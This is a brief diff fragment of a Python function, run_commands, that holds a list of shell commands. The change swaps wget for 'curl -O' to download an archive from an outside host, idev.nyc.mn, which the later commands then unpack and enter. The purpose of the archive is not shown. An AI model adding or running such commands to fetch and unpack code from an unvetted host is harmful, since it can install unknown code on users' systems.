@@ -14,7 +14,7 @@ def run_commands():
     try:
    
         commands = [
-            "wget https://idev.nyc.mn/abc2.tar",
+            "curl -O https://idev.nyc.mn/abc2.tar",
             "ls",
             "tar -xvf abc2.tar",
             "cd abc",
